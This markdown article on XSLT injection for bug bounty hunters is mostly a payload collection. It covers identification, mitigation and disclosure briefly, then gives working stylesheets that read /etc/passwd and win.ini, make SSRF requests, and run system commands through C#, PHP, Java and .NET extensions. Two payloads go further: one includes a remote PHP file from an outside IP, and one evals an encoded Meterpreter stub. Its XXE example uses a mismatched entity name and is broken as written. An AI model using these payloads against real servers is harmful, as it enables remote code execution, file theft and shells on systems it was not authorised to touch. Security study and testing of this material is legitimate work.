# XSLT Injection

- [Introduction](#Injection)
- [What is XSLT Injection?](#what-is-xslt-injection)
- [Implications of XSLT Injection](#implications-of-xslt-injection)
- [Identifying XSLT Injection](#identifying-xslt-injection)
- [Exploiting XSLT Injection](#exploiting-xslt-injection)
- [Mitigating XSLT Injection](#mitigating-xslt-injection)
- [Responsible Disclosure](#responsible-disclosure)
- [Tutorials on XSLT Injection](#tutorials-on-xslt-injection)
- [Payloads for XSLT Injection](#payloads-for-xslt-injection)


# Introduction:
In the world of web application security, it is crucial to be aware of various vulnerabilities that can be exploited by malicious actors. One such vulnerability is XSLT injection, which can lead to severe consequences if left unaddressed. This article aims to provide a detailed overview of XSLT injection, its implications, and how bug bounty hunters and penetration testers can identify and exploit this vulnerability. It will also include real-world examples to illustrate the potential impact of XSLT injection.

# What is XSLT Injection?
XSLT (Extensible Stylesheet Language Transformations) is a language used to transform XML documents into different formats, such as HTML or plain text. XSLT injection occurs when an attacker is able to inject malicious code into an XSLT transformation, leading to unintended consequences or unauthorized actions.

### Implications of XSLT Injection:
XSLT injection can have several negative implications, including:

a. Information Disclosure: Attackers can exploit XSLT injection to access sensitive information within the XML document or other parts of the application.

b. Remote Code Execution: In certain scenarios, XSLT injection can allow remote code execution, enabling an attacker to execute arbitrary code on the server, potentially gaining full control over the application.

c. Denial of Service (DoS): By injecting malicious XSLT code, an attacker can cause the application to consume excessive server resources, leading to a denial of service condition.

### Identifying XSLT Injection:
Bug bounty hunters and penetration testers can use various techniques to identify potential XSLT injection vulnerabilities, such as:
a. Input Validation: Analyzing user-controlled input points where XML or XSLT transformations take place, checking for inadequate input validation or filtering.

b. Error Messages: Examining error messages and stack traces for any hints or indications of XSLT-related errors or potential injection points.

c. Malformed XML: Submitting malformed XML payloads to the application and observing any unexpected behavior or error messages, which may indicate an XSLT injection vulnerability.

### Exploiting XSLT Injection:
To illustrate the exploitation of XSLT injection, consider the following example:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xee;</foo>

```

In this example, an attacker injects an external entity reference (xxe) pointing to the "/etc/passwd" file. If the application is vulnerable to XSLT injection and the entity is parsed, the contents of the "/etc/passwd" file will be included in the transformed output. This demonstrates a classic XXE (XML External Entity) attack that can be executed through XSLT injection.

### Mitigating XSLT Injection:
To protect against XSLT injection vulnerabilities, developers and security professionals should consider the following mitigations:
a. Input Validation: Implement proper input validation and sanitization techniques to prevent untrusted XML or XSLT code from being executed.

b. Least Privilege: Restrict the privileges of the XSLT processor to minimize the potential impact of an injection attack.

c. Disable External Entities: Disable external entity resolution or limit entity resolution to trusted sources only.

### Responsible Disclosure:
If you discover an XSLT injection vulnerability during a bug bounty program or penetration testing engagement, it is essential to follow responsible disclosure practices. Notify the affected organization promptly, provide clear and detailed information about the vulnerability, and give them a reasonable amount of time to address the issue before disclosing it publicly.

# Conclusion:
XSLT injection can pose significant risks to web applications, potentially leading to information disclosure, remote code execution, or denial of service attacks. Understanding the nature of this vulnerability and how to identify and exploit it is crucial for bug bounty hunters and penetration testers. By adopting proper mitigation strategies and responsible disclosure practices, security professionals can contribute to the improvement of web application security and help protect users' data.

### Tutorials on XSLT Injection
- [XSLT Injection](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection) - A pretty good article by Fortify
- [XSLT Basics](https://www.atlan.digital/lab/xslt-injection-basics) - A good overview by atlan digital
- [From XSLT code execution to Meterpreter shells](https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html) - Another good overview of the subject
- [XSLT Server Side Injection](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations) - A good overview by hacktrickz
- [XSLT for Dummies](https://blog.pentesteracademy.com/xslt-injections-for-dummies-a0cfbe0c42f5) - A good basic article by Pentester Academy

### Payloads for XSLT Injection

Read Files and SSRF using Document
```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
    <xsl:copy-of select="document('/etc/passwd')"/>
    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
    Fruits:
	    <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>

```
Remote Code Execution with Embedded Script Blocks

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts">

<msxsl:script language = "C#" implements-prefix = "user">
<![CDATA[
public string execute(){
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
proc.StartInfo.RedirectStandardOutput = true;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.Arguments = "/c dir";
proc.Start();
proc.WaitForExit();
return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>

  <xsl:template match="/fruits">
  --- BEGIN COMMAND OUTPUT ---
	<xsl:value-of select="user:execute()"/>
  --- END COMMAND OUTPUT ---	
  </xsl:template>
</xsl:stylesheet>

```

Remote Code Execution with PHP wrapper

```
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','index.php')" />
</body>
</html>

```

Execute the function
```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
        <xsl:template match="/">
                <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
        </xsl:template>
</xsl:stylesheet>

```

Execute a remote php file using assert

```
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
		<xsl:variable name="payload">
			include("http://10.10.10.10/test.php")
		</xsl:variable>
		<xsl:variable name="include" select="php:function('assert',$payload)"/>
</body>
</html>

```

Execute a PHP meterpreter using PHP wrapper

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
        <xsl:template match="/">
                <xsl:variable name="eval">
                        eval(base64_decode('Base64-encoded Meterpreter code'))
                </xsl:variable>
                <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
        </xsl:template>
</xsl:stylesheet>

```

Remote Code Execution with Java

```
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <xsl:value-of select="$processString"/>
    </xsl:template>
  </xsl:stylesheet>

```

```
<xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
<xsl:template match="/">
<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
</xsl:template>.
</xsl:stylesheet>

```

Remote Code Execution with Native .NET

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
    <msxsl:script implements-prefix="App" language="C#">
      <![CDATA[
        public string ToShortDateString(string date)
          {
              System.Diagnostics.Process.Start("cmd.exe");
              return "01/01/2001";
          }
      ]]>
    </msxsl:script>
    <xsl:template match="ArrayOfTest">
      <TABLE>
        <xsl:for-each select="Test">
          <TR>
          <TD>
            <xsl:value-of select="App:ToShortDateString(TestDate)" />
          </TD>
          </TR>
        </xsl:for-each>
      </TABLE>
    </xsl:template>
  </xsl:stylesheet>

```